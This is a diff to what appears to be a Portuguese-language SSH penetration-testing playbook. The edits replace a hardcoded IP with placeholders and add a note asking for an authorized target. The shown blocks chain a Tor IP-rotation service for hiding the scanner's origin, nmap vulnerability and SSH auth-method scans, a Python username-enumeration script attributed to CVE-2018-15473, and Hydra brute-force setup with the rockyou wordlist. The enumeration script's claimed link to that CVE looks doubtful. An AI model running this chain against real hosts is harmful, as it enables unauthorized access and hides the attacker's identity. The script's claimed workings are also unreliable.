@@ -75,7 +75,7 @@ sudo nano /etc/tor/torrc
 # Reiniciar Tor após editar torrc
 sudo systemctl restart tor@default
 
-nano /etc/systemd/system/tor-rotate.service
+sudo nano /etc/systemd/system/tor-rotate.service
 
 automatizar
 
@@ -84,8 +84,12 @@ Description=Tor IP Rotator
 After=network.target
 
 [Service]
+User=debian-tor
 ExecStart=/bin/bash -c "while true; do killall -HUP tor; sleep 3; curl -s --proxy socks5://127.0.0.1:9050 ifconfig.me; sleep 30; done"
 Restart=always
+ProtectSystem=strict
+NoNewPrivileges=true
+PrivateTmp=true
 
 [Install]
 WantedBy=multi-user.target
@@ -111,39 +115,53 @@ nmap -p 22 --script vuln -Pn <IP_ALVO>
 # Verificar métodos de autenticação SSH
 nmap -p 22 --script ssh-auth-methods --script-args ssh.user=root <IP_ALVO>
 
-# Descobrir hosts ativos na rede
-nmap -sn 192.168.0.0/24
+# Descobrir hosts ativos na rede (substitua pela sua rede)
+nmap -sn <REDE_ALVO>/24
 
 
 ----------------------------------------------------------------
 BLOCO 6 — FASE 2: ENUMERAÇÃO DE USUÁRIOS SSH (CVE-2018-15473)
 ----------------------------------------------------------------
 
-# Requer paramiko instalado
-pip install paramiko --break-system-packages
+# Requer paramiko instalado (usar venv para não quebrar pacotes do sistema)
+python3 -m venv /tmp/pentest-venv
+source /tmp/pentest-venv/bin/activate
+pip install paramiko==3.5.0
 
 # Script de enumeração de usuários
+# IMPORTANTE: Substitua <IP_ALVO> pelo IP do alvo autorizado
 python3 -c "
-import socket, paramiko
+import socket, paramiko, sys
 
 def check_user(hostname, port, username):
     sock = socket.socket()
-    sock.connect((hostname, port))
-    transport = paramiko.Transport(sock)
-    transport.start_client()
+    sock.settimeout(10)
     try:
+        sock.connect((hostname, port))
+    except (socket.timeout, ConnectionRefusedError, OSError) as e:
+        print(f'[-] Erro de conexão com {hostname}:{port} — {e}')
+        return
+    transport = paramiko.Transport(sock)
+    try:
+        transport.start_client()
         transport.auth_publickey(username, paramiko.RSAKey.generate(2048))
     except paramiko.ssh_exception.AuthenticationException as e:
         if 'Invalid username' not in str(e):
             print(f'[+] Usuário válido: {username}')
-    except Exception:
-        pass
+    except Exception as e:
+        print(f'[-] Erro ao verificar {username}: {e}')
     finally:
         transport.close()
 
+if len(sys.argv) < 2:
+    print('Uso: python3 script.py <IP_ALVO> [PORTA]')
+    sys.exit(1)
+
+alvo = sys.argv[1]
+porta = int(sys.argv[2]) if len(sys.argv) > 2 else 22
 users = ['root','admin','ubuntu','kali','user','test','git','www-data','deploy']
 for u in users:
-    check_user('192.168.0.184', 22, u)
+    check_user(alvo, porta, u)
 "
 
 
@@ -152,7 +170,7 @@ BLOCO 7 — FASE 3: FORÇA BRUTA SSH (HYDRA)
 ----------------------------------------------------------------
 
 # Instalar Hydra
-apt install hydra -y
+sudo apt install hydra -y
 
 # Descompactar wordlist rockyou
 gunzip /usr/share/wordlists/rockyou.txt.gz
